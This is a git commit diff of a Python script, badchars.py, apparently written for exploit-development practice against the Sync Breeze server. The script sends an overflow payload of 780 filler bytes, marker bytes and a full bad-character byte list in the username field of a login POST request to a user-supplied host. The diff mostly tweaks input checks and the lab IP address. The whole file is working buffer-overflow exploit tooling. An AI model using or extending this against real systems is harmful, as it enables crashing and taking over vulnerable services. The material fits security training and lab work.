d70c55fde80f69dce4020c899fc2d9601698869c
Hrishi Ghosalkar <87890571+rookie-cookie-8@users.noreply.github.com>
2024-05-30 13:06:05 +0530

    Update badchars.py

--- badchars.py
+++ badchars.py
@@ -1,23 +1,28 @@
 #!/usr/bin/python3
 #\x00\x0a\x0d\x25\x26\x3d\2b
 
-
 import sys,socket
-from time import sleep 
-print("***********SYNC_BREEZE Vulnerability***********")
-sleep(0.5)
+from time import sleep
+
 ip_address=input("Enter the IP address\n")
-port_number=input("Enter Port number\n")
+port_number=input("Enter the port number\n")
 
 if (len(ip_address)<=0) or (len(port_number)<=0):
     if (len(ip_address)>0) and (len(port_number)<=0):
-        print("Port number field is empty")
+        print("*" * 30)
+        print("port number field is empty")
     elif (len(ip_address)<=0) and (len(port_number)>0):
+        print("*" * 30)
         print("IP address field is empty")
+    elif (len(ip_address)<=0) and (len(port_number)<=0):
+        print("*" * 30)
+        print("IP address field is empty")
+        print("Port number field is empty")
     else:
+        print("*" * 30)
         print("Issues with the user input")
-elif (len(ip_address)>0) and (len(port_number)>0):
-    print("*********************************************")
+
+elif (len(ip_address)>0) or (len(port_number)>0):
     badchars = (
   b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10"
   b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
@@ -41,21 +46,22 @@ elif (len(ip_address)>0) and (len(port_number)>0):
     size=b"A" * 780 + b"B" * 4 + b"C" * 4 + badchars
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.connect((ip_address, int(port_number)))
-    buff=b"username=" +  size + b"&password=A"
+    buff=b"username=" + size + b"&password=A"
+
 
     buffer=b"POST /login HTTP/1.1\r\n"
-    buffer+=b"Host: 192.168.100.211\r\n"
-    buffer+=b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\r\n"
+    buffer+=b"Host: 192.168.100.215\r\n"
+    buffer+=b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\r\n"
     buffer+=b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
     buffer+=b"Accept-Language: en-US,en;q=0.5\r\n"
     buffer+=b"Accept-Encoding: gzip, deflate\r\n"
     buffer+=b"Content-Type: application/x-www-form-urlencoded\r\n"
-    buffer+=b"Content-Length: "+str(len(buff)).encode('utf-8')+b"\r\n"
-    buffer+=b"Origin: http://192.168.100.211\r\n"
+    buffer+=b"Content-Length: "+ str(len(buff)).encode('utf-8')+ b"\r\n"
+    buffer+=b"Origin: http://192.168.100.215\r\n"
     buffer+=b"Connection: keep-alive\r\n"
-    buffer+=b"Referer: http://192.168.100.211/login\r\n"
+    buffer+=b"Referer: http://192.168.100.215/login\r\n"
     buffer+=b"\r\n"
+
     buffer=buffer+buff
     s.send((buffer))
     s.close()
-              
